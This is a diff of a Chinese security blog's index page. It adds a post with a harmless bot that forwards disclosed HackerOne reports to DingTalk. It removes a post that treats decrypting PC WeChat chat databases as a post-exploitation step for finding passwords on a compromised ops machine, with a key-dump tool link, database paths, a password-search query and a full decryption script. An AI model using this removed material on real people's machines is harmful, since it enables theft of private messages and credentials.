@@ -255,6 +255,83 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/27/%E7%9B%91%E6%8E%A7hackone%E6%8A%A5%E5%91%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/27/%E7%9B%91%E6%8E%A7hackone%E6%8A%A5%E5%91%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/" class="post-title-link" itemprop="url">监控hackone报告机器人</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-04-27 16:38:36 / 修改时间：16:40:54" itemprop="dateCreated datePublished" datetime="2023-04-27T16:38:36+08:00">2023-04-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="监控hackone报告机器人"><a href="#监控hackone报告机器人" class="headerlink" title="监控hackone报告机器人"></a>监控hackone报告机器人</h1><p>找了个机器人，分享一下脚本。使用方法就是</p>
+<ol>
+<li><p>创建钉钉机器人，选择自定义 WEBHOOK 类型，可通过自定义关键词或 IP 地址进行安全设置。创建完成后，复制机器人的 accesstoken。</p>
+</li>
+<li><p>将源代码中的 accesstoken 替换为您自己的，使用 Python3.8.X 在后台运行。您可以直接输入 <code>python3 h1_notifier.py</code> &amp; 或在 tmux 中运行。</p>
+<p>后续可能会过期无法使用，但是无所谓，我到时候再改就行。</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> feedparser</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">&#x27;script_output.log&#x27;</span>,</span><br><span class="line">                    level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CONFIG</span></span><br><span class="line">DINGTALK_WEBHOOK = <span class="string">&quot;https://oapi.dingtalk.com/robot/send?access_token=&quot;</span></span><br><span class="line">last_sent_tweet_pubdate = <span class="literal">None</span>  <span class="comment"># Add a global variable</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_link_description</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        meta_title_element = soup.find(<span class="string">&#x27;meta&#x27;</span>, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;description&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta_title_element <span class="keyword">and</span> <span class="string">&#x27;content&#x27;</span> <span class="keyword">in</span> meta_title_element.attrs:</span><br><span class="line">            description = meta_title_element[<span class="string">&#x27;content&#x27;</span>].replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            description = <span class="string">&#x27;No Description Found&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> description</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.info(<span class="string">f&quot;Error getting description for <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_dingtalk</span>(<span class="params">content, title</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;msgtype&quot;</span>: <span class="string">&quot;markdown&quot;</span>,</span><br><span class="line">        <span class="string">&quot;markdown&quot;</span>: &#123;<span class="string">&quot;title&quot;</span>: title, <span class="string">&quot;text&quot;</span>: content&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(DINGTALK_WEBHOOK, headers=headers, json=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_new_published_tweets</span>(<span class="params">feed, last_sent_tweet_pubdate</span>):</span></span><br><span class="line">    new_published_tweets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> feed.entries:</span><br><span class="line">        tweet_pubdate = datetime.strptime(entry.published.replace(<span class="string">&quot;GMT&quot;</span>, <span class="string">&quot;+0000&quot;</span>), <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %z&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> last_sent_tweet_pubdate <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> tweet_pubdate &gt; last_sent_tweet_pubdate:</span><br><span class="line">            new_published_tweets.append(entry)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_published_tweets</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_tweet</span>(<span class="params">url_list</span>):</span></span><br><span class="line">    <span class="keyword">global</span> last_sent_tweet_pubdate</span><br><span class="line">    <span class="comment"># random rss_url</span></span><br><span class="line">    random.shuffle(url_list)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        feed = feedparser.parse(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(feed.entries) &gt; <span class="number">0</span>:</span><br><span class="line">            new_published_tweets = get_new_published_tweets(feed, last_sent_tweet_pubdate)</span><br><span class="line">            <span class="keyword">if</span> new_published_tweets:</span><br><span class="line">                <span class="keyword">for</span> entry <span class="keyword">in</span> new_published_tweets:</span><br><span class="line">                    tweet_text = entry.title</span><br><span class="line">                    url_link = re.search(<span class="string">r&#x27;https://hackerone\.com/reports/\d+&#x27;</span>, tweet_text)</span><br><span class="line">                    <span class="keyword">if</span> url_link:</span><br><span class="line">                        <span class="comment"># Convert the link in the tweet to MarkDown format to support mobile access.</span></span><br><span class="line">                        tweet_text = tweet_text.replace(url_link.group(), <span class="string">f&quot;[<span class="subst">&#123;url_link.group()&#125;</span>](<span class="subst">&#123;url_link.group()&#125;</span>)&quot;</span>)</span><br><span class="line">                        logging.info(<span class="string">f&quot;RSS URL used: <span class="subst">&#123;url&#125;</span>, Latest tweet: <span class="subst">&#123;tweet_text[:<span class="number">30</span>]&#125;</span>, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">                        tweet_pubdate = datetime.strptime(entry.published.replace(<span class="string">&quot;GMT&quot;</span>, <span class="string">&quot;+0000&quot;</span>), <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %z&#x27;</span>)</span><br><span class="line">                        hackerone_url_match = re.search(<span class="string">r&#x27;https://hackerone\.com/reports/\d+&#x27;</span>, tweet_text)</span><br><span class="line">                        hackerone_url = hackerone_url_match.group()</span><br><span class="line">                        link_description = get_link_description(hackerone_url)</span><br><span class="line">                        <span class="keyword">if</span> link_description:</span><br><span class="line">                            content = <span class="string">f&quot;**Tweet:** \n\n<span class="subst">&#123;tweet_text&#125;</span>\n\n**Description:**\n\n <span class="subst">&#123;link_description&#125;</span>\n\n&quot;</span></span><br><span class="line">                            send_to_dingtalk(content, link_description)</span><br><span class="line">                        last_sent_tweet_pubdate = <span class="built_in">max</span>(last_sent_tweet_pubdate, tweet_pubdate) <span class="keyword">if</span> last_sent_tweet_pubdate <span class="keyword">else</span> tweet_pubdate</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.info(<span class="string">f&quot;Tweet does not contain hackerone.com, skipping, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.info(<span class="string">f&quot;Tweet has already been sent, skipping, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.info(<span class="string">&quot;Unable to get valid RSS data from all provided URLs.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> last_sent_tweet_pubdate</span><br><span class="line">    TWITTER_USER = <span class="string">&#x27;disclosedh1&#x27;</span></span><br><span class="line"></span><br><span class="line">    TWITTER_RSS_URLS = [</span><br><span class="line">        <span class="string">f&quot;https://nitter.net/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">        <span class="comment">#f&quot;https://nitter.unixfox.eu/&#123;TWITTER_USER&#125;/rss&quot;,</span></span><br><span class="line">        <span class="string">f&quot;https://nitter.snopyta.org/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;https://twitter.owacon.moe/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">&quot;Checking for new tweets...&quot;</span>)</span><br><span class="line">    process_tweet(TWITTER_RSS_URLS)</span><br><span class="line">    </span><br><span class="line">    schedule.every(<span class="number">10</span>).minutes.do(process_tweet, TWITTER_RSS_URLS)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -606,102 +683,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/" class="post-title-link" itemprop="url">pc端微信个人信息与聊天记录取证</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-04-19 13:39:59 / 修改时间：13:41:08" itemprop="dateCreated datePublished" datetime="2023-04-19T13:39:59+08:00">2023-04-19</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="pc端微信个人信息与聊天记录取证"><a href="#pc端微信个人信息与聊天记录取证" class="headerlink" title="pc端微信个人信息与聊天记录取证"></a>pc端微信个人信息与聊天记录取证</h1><p>有些时候拿下了运维机，可以尝试拿下聊天记录，这样就可以找到一些机器的密码和敏感信息。</p>
-<h1 id="数据库密钥"><a href="#数据库密钥" class="headerlink" title="数据库密钥"></a>数据库密钥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AdminTest0/SharpWxDump</span><br></pre></td></tr></table></figure>
-
-<p>用这个工具即可，提取当前电脑的一些微信客户端的信息</p>
-<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132133712.png" alt="image-20230419132133712"></p>
-<p>而且每个微信客户端对应的偏移值是不一样的，所以就必须要作者不定期的更新每个版本的偏移值，以后我们自己有时间了自己研究研究也可以进行相关的更新。</p>
-<h1 id="聊天记录解密"><a href="#聊天记录解密" class="headerlink" title="聊天记录解密"></a>聊天记录解密</h1><p>现在就是拿到数据库密钥之后，对本地的聊天记录进行获取就可以了</p>
-<p>wxid_xxxxxxxx一般都在文档目录下，作为存储目录，下载对应的聊天记录文件到本地</p>
-<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132505478.png" alt="image-20230419132505478"></p>
-<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132522796.png" alt="image-20230419132522796"></p>
-<p>关于聊天记录文件：MSG.db，超出240MB会自动生成MSG1.db，以此类推</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG0.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG1.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG2.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\MicroMsg.db &gt; Contact字段 &gt; 好友列表</span><br><span class="line">wxid_xxxxxxxx\Msg\MediaMsg.db &gt; 语音 &gt; 格式为silk</span><br></pre></td></tr></table></figure>
-
-<p>然后用最后的解密代码对聊天记录文件进行解密</p>
-<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132952952.png" alt="image-20230419132952952"></p>
-<p>解密成功。</p>
-<p>将解密后的MSG0.db拖入数据库工具，查询语句查找关键字：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> &quot;MSG&quot; <span class="keyword">WHERE</span> StrContent  <span class="keyword">like</span><span class="string">&#x27;%密码%&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419133743583.png" alt="image-20230419133743583"></p>
-<h1 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, ctypes, sys, getopt</span><br><span class="line"></span><br><span class="line">SQLITE_FILE_HEADER = <span class="built_in">bytes</span>(<span class="string">&#x27;SQLite format 3&#x27;</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>) + <span class="built_in">bytes</span>(<span class="number">1</span>)</span><br><span class="line">IV_SIZE = <span class="number">16</span></span><br><span class="line">HMAC_SHA1_SIZE = <span class="number">20</span></span><br><span class="line">KEY_SIZE = <span class="number">32</span></span><br><span class="line">DEFAULT_PAGESIZE = <span class="number">4096</span></span><br><span class="line">DEFAULT_ITER = <span class="number">64000</span></span><br><span class="line">opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&#x27;hk:d:&#x27;</span>)</span><br><span class="line">input_pass = <span class="string">&#x27;&#x27;</span></span><br><span class="line">input_dir = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> op, value <span class="keyword">in</span> opts:</span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&#x27;-k&#x27;</span>:</span><br><span class="line">        input_pass = value</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">            input_dir = value</span><br><span class="line"></span><br><span class="line">password = <span class="built_in">bytes</span>.fromhex(input_pass.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_dir, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">    blist = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(blist))</span><br><span class="line">salt = blist[:<span class="number">16</span>]</span><br><span class="line">key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password, salt, DEFAULT_ITER, KEY_SIZE)</span><br><span class="line">first = blist[<span class="number">16</span>:DEFAULT_PAGESIZE]</span><br><span class="line">mac_salt = <span class="built_in">bytes</span>([x ^ <span class="number">58</span> <span class="keyword">for</span> x <span class="keyword">in</span> salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, key, mac_salt, <span class="number">2</span>, KEY_SIZE)</span><br><span class="line">hash_mac = hmac.new(mac_key, digestmod=<span class="string">&#x27;sha1&#x27;</span>)</span><br><span class="line">hash_mac.update(first[:-<span class="number">32</span>])</span><br><span class="line">hash_mac.update(<span class="built_in">bytes</span>(ctypes.c_int(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hash_mac.digest() == first[-<span class="number">32</span>:-<span class="number">12</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Decryption Success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Password Error&#x27;</span>)</span><br><span class="line">blist = [blist[i:i + DEFAULT_PAGESIZE] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DEFAULT_PAGESIZE, <span class="built_in">len</span>(blist), DEFAULT_PAGESIZE)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_dir, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">    f.write(SQLITE_FILE_HEADER)</span><br><span class="line">    t = AES.new(key, AES.MODE_CBC, first[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">    f.write(t.decrypt(first[:-<span class="number">48</span>]))</span><br><span class="line">    f.write(first[-<span class="number">48</span>:])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blist:</span><br><span class="line">        t = AES.new(key, AES.MODE_CBC, i[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">        f.write(t.decrypt(i[:-<span class="number">48</span>]))</span><br><span class="line">        f.write(i[-<span class="number">48</span>:])</span><br></pre></td></tr></table></figure>
-
-<p>使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\Decode.py -k 数据库密钥 -d .\MSG0.db</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -773,7 +754,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">176</span>
+          <span class="site-state-item-count">177</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
